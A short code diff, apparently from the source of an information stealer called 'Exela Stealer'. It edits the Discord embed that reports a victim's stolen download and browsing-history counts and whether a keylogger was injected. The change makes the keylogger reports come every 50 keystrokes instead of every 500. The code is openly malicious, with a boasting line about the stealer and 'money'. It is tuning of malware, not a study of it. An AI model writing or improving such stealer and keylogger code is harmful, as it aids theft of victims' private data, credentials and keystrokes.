@@ -672,7 +672,7 @@ class QuicaxdExela:
         embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
         if injectKeylogger == "%keyloggertrue%":
-            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 500 keystrokes```")
+            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 50 keystrokes```")
         else:
             embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
         embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
